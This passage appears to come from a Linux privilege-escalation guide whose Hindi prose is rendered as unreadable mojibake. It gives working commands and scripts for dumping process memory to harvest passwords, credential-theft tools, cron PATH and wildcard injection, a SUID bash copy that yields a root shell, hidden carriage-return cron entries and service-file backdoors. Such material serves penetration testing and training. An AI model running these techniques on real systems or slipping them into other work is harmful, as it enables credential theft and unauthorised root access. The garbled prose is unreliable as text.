рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ рдПрдлрдЯреАрдкреА рд╕реЗрд╡рд╛ рдХреА рдореЗрдореЛрд░реА рдХрд╛ рдЙрдкрдпреЛрдЧ рд╣реИ (рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП) рддреЛ рдЖрдк рд╣реАрдк рдХреЛ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЗрд╕рдХреЗ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХреЗ рднреАрддрд░ рдЦреЛрдЬ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB рд╕реНрдХреНрд░рд┐рдкреНрдЯ

{% code title="dump-memory.sh" %}
```bash
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
{% endcode %}

#### /proc/$pid/maps рдФрд░ /proc/$pid/mem

рдПрдХ рджрд┐рдпрд╛ рдЧрдпрд╛ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдЖрдИрдбреА рдХреЗ рд▓рд┐рдП, **maps рджрд┐рдЦрд╛рддрд╛ рд╣реИ рдХрд┐ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ** рд╡рд░реНрдЪреБрдЕрд▓ рдкрддрд╛ рд╕реНрдерд╛рди рдореЗрдВ рдореЗрдореЛрд░реА рдХреИрд╕реЗ рдореИрдк рд╣реИ; рдпрд╣ рднреА **рдкреНрд░рддреНрдпреЗрдХ рдореИрдк рдХреНрд╖реЗрддреНрд░ рдХреА рдЕрдиреБрдорддрд┐рдпрд╛рдБ рджрд┐рдЦрд╛рддрд╛ рд╣реИ**ред **mem** рдкреНрдпреВрдбреЛ рдлрд╝рд╛рдЗрд▓ **рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреА рдореЗрдореЛрд░реА рдХреЛ рдЦреБрдж рд╣реА рдЙрдЬрд╛рдЧрд░ рдХрд░рддрд╛ рд╣реИ**ред рд╣рдо **maps** рдлрд╝рд╛рдЗрд▓ рд╕реЗ рдЬрд╛рдирддреЗ рд╣реИрдВ рдХрд┐ рдХреМрди рд╕реЗ **рдореЗрдореЛрд░реА рдХреНрд╖реЗрддреНрд░ рдкрдврд╝рдиреЗ рдпреЛрдЧреНрдп рд╣реИрдВ** рдФрд░ рдЙрдирдХреЗ рдСрдлрд╕реЗрдЯреНрд╕ред рд╣рдо рдЗрд╕ рдЬрд╛рдирдХрд╛рд░реА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ **mem рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рдЬрд╛рдиреЗ рдФрд░ рд╕рднреА рдкрдврд╝рдиреЗ рдпреЛрдЧреНрдп рдХреНрд╖реЗрддреНрд░реЛрдВ рдХреЛ рдПрдХ рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рдбрдВрдк рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП**ред
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` рдкреНрд░рдгрд╛рд▓реА рдХреА **рднреМрддрд┐рдХ** рд╕реНрдореГрддрд┐ рддрдХ рдкрд╣реБрдВрдЪ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ, рди рдХрд┐ рдЖрднрд╛рд╕реА рд╕реНрдореГрддрд┐ред рдХрд░реНрдгреЗрд▓ рдХрд╛ рдЖрднрд╛рд╕реА рдкрддрд╛ рдЕрдВрддрд░реНрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП /dev/kmem рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред
рд╕рд╛рдорд╛рдиреНрдпрдд: `/dev/mem` рдХреЗрд╡рд▓ **root** рдФрд░ **kmem** рд╕рдореВрд╣ рджреНрд╡рд╛рд░рд╛ рдкрдврд╝рдиреЗ рдпреЛрдЧреНрдп рд╣реЛрддрд╛ рд╣реИред
```
strings /dev/mem -n10 | grep -i PASS
```
### рд▓рд┐рдирдХреНрд╕ рдХреЗ рд▓рд┐рдП ProcDump

ProcDump рдПрдХ рд▓рд┐рдирдХреНрд╕ рдХрд╛ рдирдпрд╛ рд░реВрдкрд╛рдВрддрд░рдг рд╣реИ, рдЬреЛ рд╡рд┐рдВрдбреЛрдЬ рдХреЗ рд╕рд┐рд╕рдЗрдВрдЯрд░рдирд▓реНрд╕ рд╕реБрдЗрдЯ рдХреЗ рдХреНрд▓рд╛рд╕рд┐рдХ ProcDump рдЯреВрд▓ рдХрд╛ рд╣реИред рдЗрд╕реЗ [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux) рд╕реЗ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВред
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### рдЙрдкрдХрд░рдг

рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреА рдореЗрдореЛрд░реА рдбрдВрдк рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк рдирд┐рдореНрди рдЙрдкрдХрд░рдг рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

* [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
* [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (рд░реВрдЯ) - \_рдЖрдк рд░реВрдЯ рдЖрд╡рд╢реНрдпрдХрддрд╛рдУрдВ рдХреЛ рдореИрдиреНрдпреБрдЕрд▓ рд░реВрдк рд╕реЗ рд╣рдЯрд╛ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЖрдкрдХреЗ рджреНрд╡рд╛рд░рд╛ рд╕реНрд╡рд╛рдорд┐рдд рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рдбрдВрдк рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ
* [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) рд╕реЗ рд╕реНрдХреНрд░рд┐рдкреНрдЯ A.5 (рд░реВрдЯ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ)

### рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдореЗрдореЛрд░реА рд╕реЗ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕

#### рдореИрдиреНрдпреБрдЕрд▓ рдЙрджрд╛рд╣рд░рдг

рдпрджрд┐ рдЖрдкрдХреЛ рд▓рдЧрддрд╛ рд╣реИ рдХрд┐ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдЪрд▓ рд░рд╣реА рд╣реИ:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
рдЖрдк рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рдбрдВрдк рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреА рдореЗрдореЛрд░реА рдХреЛ рдбрдВрдк рдХрд░рдиреЗ рдХреЗ рд╡рд┐рднрд┐рдиреНрди рддрд░реАрдХреЛрдВ рдХреЛ рдЬрд╛рдирдиреЗ рдХреЗ рд▓рд┐рдП рдкрд╣рд▓реЗ рдЦрдВрдб рджреЗрдЦреЗрдВ) рдФрд░ рдореЗрдореЛрд░реА рдореЗрдВ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдЦреЛрдЬ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### рдорд┐рдореАрдкреЗрдВрдЧреНрд╡рд┐рди

рдпрд╣ рдЯреВрд▓ [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) **рдореЗрдореЛрд░реА рд╕реЗ рд╕рд╛рдл рдкрд╛рда рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдЪреБрд░рд╛ рд▓реЗрдЧрд╛** рдФрд░ рдХреБрдЫ **рдкреНрд░рд╕рд┐рджреНрдз рдлрд╝рд╛рдЗрд▓реЛрдВ** рд╕реЗред рдЗрд╕реЗ рд╕рд╣реА рдврдВрдЧ рд╕реЗ рдХрд╛рдо рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд░реВрдЯ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИред

| рд╡рд┐рд╢реЗрд╖рддрд╛                                           | рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХрд╛ рдирд╛рдо         |
| ------------------------------------------------- | -------------------- |
| GDM рдкрд╛рд╕рд╡рд░реНрдб (Kali рдбреЗрд╕реНрдХрдЯреЙрдк, Debian рдбреЗрд╕реНрдХрдЯреЙрдк)       | gdm-password         |
| Gnome Keyring (Ubuntu рдбреЗрд╕реНрдХрдЯреЙрдк, ArchLinux рдбреЗрд╕реНрдХрдЯреЙрдк) | gnome-keyring-daemon |
| LightDM (Ubuntu рдбреЗрд╕реНрдХрдЯреЙрдк)                          | lightdm              |
| VSFTPd (рд╕рдХреНрд░рд┐рдп FTP рдХрдиреЗрдХреНрд╢рди)                   | vsftpd               |
| Apache2 (рд╕рдХреНрд░рд┐рдп HTTP рдмреЗрд╕рд┐рдХ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рд╕рддреНрд░)         | apache2              |
| OpenSSH (рд╕рдХреНрд░рд┐рдп SSH рд╕рддреНрд░ - рд╕реБрдбреЛ рдЙрдкрдпреЛрдЧ)        | sshd:                |

#### рдЦреЛрдЬ рд░реЗрдЬреЗрдХреНрд╕/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## рдирд┐рд░реНрдзрд╛рд░рд┐рдд/Cron рдиреМрдХрд░рд┐рдпрд╛рдБ

рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рдХреНрдпрд╛ рдХреЛрдИ рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдиреМрдХрд░реА рд╡рдВрд▓рд░реЗрдмрд▓ рд╣реИред рд╢рд╛рдпрдж рдЖрдк рдХрд┐рд╕реА рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХрд╛ рдлрд╛рдпрджрд╛ рдЙрдард╛ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ рд░реВрдЯ рджреНрд╡рд╛рд░рд╛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИ (рд╡рд╛рдЗрд▓реНрдбрдХрд╛рд░реНрдб рд╡рд▓реНрди? рдХреНрдпрд╛ рд░реВрдЯ рджреНрд╡рд╛рд░рд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ? рд╕рд┐рдорд▓рд┐рдВрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ? рд░реВрдЯ рджреНрд╡рд╛рд░рд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдореЗрдВ рд╡рд┐рд╢реЗрд╖ рдлрд╝рд╛рдЗрд▓реЗрдВ рдмрдирд╛рдПрдБ?)ред
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### рдХреНрд░реЙрди рдкрде

рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, _/etc/crontab_ рдХреЗ рдЕрдВрджрд░ рдЖрдк рдкрд╛рде рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ "user" рдХреЛ /home/user рдкрд░ рд▓реЗрдЦрди рдЕрдзрд┐рдХрд╛рд░ рд╣реИ_)

рдпрджрд┐ рдЗрд╕ crontab рдХреЗ рдЕрдВрджрд░ рд░реВрдЯ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛрдИ рдХрдорд╛рдВрдб рдпрд╛ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдмрд┐рдирд╛ рдкрде рд╕реЗрдЯ рдХрд┐рдП рдХреЛ рдХреНрд░рд┐рдпрд╛рдиреНрд╡рд┐рдд рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рддрд╛ рд╣реИред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП: _\* \* \* \* root overwrite.sh_\
рддреЛ, рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд░реВрдЯ рд╢реЗрд▓ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### рдХреНрд░реЙрди рдХрд╛ рдЙрдкрдпреЛрдЧ рд╡рд╛рдЗрд▓реНрдбрдХрд╛рд░реНрдб рдХреЗ рд╕рд╛рде рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ (рд╡рд╛рдЗрд▓реНрдбрдХрд╛рд░реНрдб рдЗрдВрдЬреЗрдХреНрд╢рди)

рдпрджрд┐ рд░реВрдЯ рджреНрд╡рд╛рд░рд╛ рдПрдХ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ рдХрдорд╛рдВрдб рдореЗрдВ "**\***" рд╣реИ, рддреЛ рдЖрдк рдЗрд╕рдХрд╛ рд╢реЛрд╖рдг рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рдЕрдкреНрд░рддреНрдпрд╛рд╢рд┐рдд рдЪреАрдЬреЗрдВ рдХреА рдЬрд╛ рд╕рдХреЗрдВ (рдЬреИрд╕реЗ privesc). рдЙрджрд╛рд╣рд░рдг:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**рдпрджрд┐ рд╡рд╛рдЗрд▓реНрдбрдХрд╛рд░реНрдб рдХрд┐рд╕реА рдкрде рдХреЗ рдкрд╣рд▓реЗ рд╣реЛ рдЬреИрд╕реЗ** _**/some/path/\***_ **, рддреЛ рдпрд╣ рдХрдордЬреЛрд░ рдирд╣реАрдВ рд╣реИ (рдпрд╣рд╛рдБ рддрдХ рдХрд┐** _**./\***_ **рднреА рдирд╣реАрдВ рд╣реИред)**

рдФрд░ рд╡рд╛рдЗрд▓реНрдбрдХрд╛рд░реНрдб рд╢реЛрдзрди рддрдХрдиреАрдХреЛрдВ рдХреЗ рд▓рд┐рдП рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкреГрд╖реНрда рдХреЛ рдкрдврд╝реЗрдВ:

{% content-ref url="wildcards-spare-tricks.md" %}
[wildcards-spare-tricks.md](wildcards-spare-tricks.md)
{% endcontent-ref %}

### рдХреНрд░реЙрди рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдЕрдзрд┐рд▓реЗрдЦрдг рдФрд░ рд╕рд┐рдорд▓рд┐рдВрдХ

рдпрджрд┐ рдЖрдк **рд░реВрдЯ рджреНрд╡рд╛рд░рд╛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рд╕реА рдХреНрд░реЙрди рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**, рддреЛ рдЖрдк рдмрд╣реБрдд рдЖрд╕рд╛рдиреА рд╕реЗ рдПрдХ рд╢реИрд▓ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
рдпрджрд┐ рд░реВрдЯ рджреНрд╡рд╛рд░рд╛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдПрдХ **рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреА рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдЖрдкрдХреЗ рдкрд╛рд╕ рдкреВрд░реНрдг рдкрд╣реБрдВрдЪ рд╣реИ**, рддреЛ рд╢рд╛рдпрдж рдЙрд╕ рдлрд╝реЛрд▓реНрдбрд░ рдХреЛ рд╣рдЯрд╛рдирд╛ рдФрд░ **рдПрдХ рдФрд░ рдлрд╝реЛрд▓реНрдбрд░ рдХреЗ рд▓рд┐рдП рдПрдХ рд╕рд┐рдорд▓рд┐рдВрдХ рдлрд╝реЛрд▓реНрдбрд░ рдмрдирд╛рдирд╛** рдЬреЛ рдЖрдкрдХреЗ рджреНрд╡рд╛рд░рд╛ рдирд┐рдпрдВрддреНрд░рд┐рдд рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЛ рд╕реЗрд╡ рдХрд░рддрд╛ рд╣реИ
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### рдирд┐рдпрдорд┐рдд cron jobs

рдЖрдк рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рдХрд╛ рдореЙрдирд┐рдЯрд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ 1, 2 рдпрд╛ 5 рдорд┐рдирдЯ рдХреЗ рдЕрдВрддрд░ рд╕реЗ рдЪрд▓рд╛рдИ рдЬрд╛ рд░рд╣реА рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреА рдЦреЛрдЬ рдХрд░реЗрдВред рд╢рд╛рдпрдж рдЖрдк рдЗрд╕рдХрд╛ рдлрд╛рдпрджрд╛ рдЙрдард╛ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рдЙрдиреНрдирдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, **1 рдорд┐рдирдЯ рдХреЗ рджреМрд░рд╛рди рд╣рд░ 0.1 рд╕реЗрдХрдВрдб рдХрд╛ рдореЙрдирд┐рдЯрд░рд┐рдВрдЧ** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, **рдХрдо рдЪрд▓рд╛рдП рдЧрдП рдХрдорд╛рдВрдбреЛрдВ рд╕реЗ рдХреНрд░рдордмрджреНрдз рдХрд░реЗрдВ** рдФрд░ рд╕рдмрд╕реЗ рдЕрдзрд┐рдХ рдЪрд▓рд╛рдП рдЧрдП рдХрдорд╛рдВрдбреЛрдВ рдХреЛ рд╣рдЯрд╛рдиреЗ рдХреЗ рд▓рд┐рдП, рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**рдЖрдк рдпрд╣рд╛рдБ рднреА рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (рдпрд╣ рд╣рд░ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рдореЙрдирд┐рдЯрд░ рдФрд░ рд╕реВрдЪреАрдмрджреНрдз рдХрд░реЗрдЧрд╛ рдЬреЛ рд╢реБрд░реВ рд╣реЛрддреА рд╣реИ)ред

### рдЕрджреГрд╢реНрдп cron рдЬреЙрдмреНрд╕

рдПрдХ рдХреНрд░реЙрди рдЬреЙрдм рдмрдирд╛рдирд╛ рд╕рдВрднрд╡ рд╣реИ **рдПрдХ рдХрдореЗрдВрдЯ рдХреЗ рдмрд╛рдж рдПрдХ рдХреИрд░рд┐рдЬ рд░рд┐рдЯрд░реНрди рдбрд╛рд▓рдХрд░** (рдиреНрдпреВрд▓рд╛рдЗрди рд╡рд░реНрдгрдХреНрд░рдо рдХреЗ рдмрд┐рдирд╛), рдФрд░ рдХреНрд░реЙрди рдЬреЙрдм рдХрд╛рдо рдХрд░реЗрдЧрд╛ред рдЙрджрд╛рд╣рд░рдг (рдХреИрд░рд┐рдЬ рд░рд┐рдЯрд░реНрди рдЪрд╛рд░ рдзреНрдпрд╛рди рджреЗрдВ):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## рд╕реЗрд╡рд╛рдПрдВ

### рд▓рд┐рдЦрдиреЗ рдпреЛрдЧреНрдп _.service_ рдлрд╝рд╛рдЗрд▓реЗрдВ

рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рдХреНрдпрд╛ рдЖрдк рдХрд┐рд╕реА рднреА `.service` рдлрд╝рд╛рдЗрд▓ рдХреЛ рд▓рд┐рдЦ рд╕рдХрддреЗ рд╣реИрдВ, рдпрджрд┐ рд╣рд╛рдВ, рддреЛ рдЖрдк рдЗрд╕реЗ **рд╕рдВрд╢реЛрдзрд┐рдд** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рдЬрдм рд╕реЗрд╡рд╛ **рд╢реБрд░реВ**, **рдкреБрдирдГ рдЖрд░рдВрдн** рдпрд╛ **рд░реЛрдХреА** рдЬрд╛рддреА рд╣реИ, рддреЛ рдЖрдкрдХрд╛ **рдмреИрдХрдбреЛрд░ рдХрд╛рд░реНрдпрд╛рдиреНрд╡рд┐рдд** рд╣реЛ рд╕рдХрддрд╛ рд╣реИ (рд╢рд╛рдпрдж рдЖрдкрдХреЛ рдорд╢реАрди рдХреЛ рд░рд┐рдмреВрдЯ рд╣реЛрдиреЗ рддрдХ рдХрд╛ рдЗрдВрддрдЬрд╝рд╛рд░ рдХрд░рдирд╛ рдкрдбрд╝реЗрдЧрд╛)ред\
рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП рдЕрдкрдирд╛ рдмреИрдХрдбреЛрд░ рдмрдирд╛рдПрдВ .service рдлрд╝рд╛рдЗрд▓ рдХреЗ рдЕрдВрджрд░ **`ExecStart=/tmp/script.sh`**

### рд▓рд┐рдЦрдиреЗ рдпреЛрдЧреНрдп рд╕реЗрд╡рд╛ рдмрд╛рдЗрдирд░реА

рдзреНрдпрд╛рди рд░рдЦреЗрдВ рдХрд┐ рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ рд╕реЗрд╡рд╛рдПрдВ рджреНрд╡рд╛рд░рд╛ рдХреНрд░рд┐рдпрд╛рдиреНрд╡рд┐рдд рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рдмрд╛рдЗрдирд░реА рдкрд░ **рд▓рд┐рдЦрдиреЗ рдХреА рдЕрдиреБрдорддрд┐** рд╣реИ, рддреЛ рдЖрдк рдЙрдиреНрд╣реЗрдВ рдмреИрдХрдбреЛрд░ рдХреЗ рд▓рд┐рдП рдмрджрд▓ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рдЬрдм рд╕реЗрд╡рд╛рдПрдВ рдкреБрдирдГ рдХреНрд░рд┐рдпрд╛рдиреНрд╡рд┐рдд рд╣реЛрдВ, рддреЛ рдмреИрдХрдбреЛрд░ рдХрд╛рд░реНрдпрд╛рдиреНрд╡рд┐рдд рд╣реЛрдВрдЧреЗред

### systemd PATH - рд╕рд╛рдкреЗрдХреНрд╖ рдорд╛рд░реНрдЧ

рдЖрдк **systemd** рджреНрд╡рд╛рд░рд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ PATH рдХреЛ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
systemctl show-environment
```
рдпрджрд┐ рдЖрдкрдХреЛ рд▓рдЧрддрд╛ рд╣реИ рдХрд┐ рдЖрдк **рдХрд┐рд╕реА рднреА рдлрд╝реЛрд▓реНрдбрд░ рдореЗрдВ рд▓рд┐рдЦ рд╕рдХрддреЗ** рд╣реИрдВ рддреЛ рдЖрдкрдХреЛ **рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рдмрдврд╝рд╛рдиреЗ** рдХреА рд╕рдВрднрд╛рд╡рдирд╛ рд╣реЛ рд╕рдХрддреА рд╣реИред рдЖрдкрдХреЛ **рд╕реЗрд╡рд╛ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди** рдлрд╝рд╛рдЗрд▓реЛрдВ рдкрд░ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛ рд░рд╣реЗ **рд╕рд╛рдкреЗрдХреНрд╖ рдорд╛рд░реНрдЧреЛрдВ рдХреА рдЦреЛрдЬ** рдХрд░рдиреА рдЪрд╛рд╣рд┐рдП:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
